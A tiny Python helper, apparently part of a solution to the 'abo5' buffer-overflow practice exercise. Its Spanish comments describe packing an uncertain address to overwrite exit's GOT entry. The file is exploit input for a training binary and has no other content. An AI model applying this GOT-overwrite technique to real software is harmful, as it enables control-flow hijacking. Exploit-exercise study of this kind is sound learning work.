#! /usr/bin/env python
"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """
   
import sys
from struct import pack
   	 
system_addr = 0x8b0cec83         #???? addr de buf
  
exploit = pack("<I", system_addr)  #sobreescribo exit en la GOT
   
sys.stdout.write(exploit)
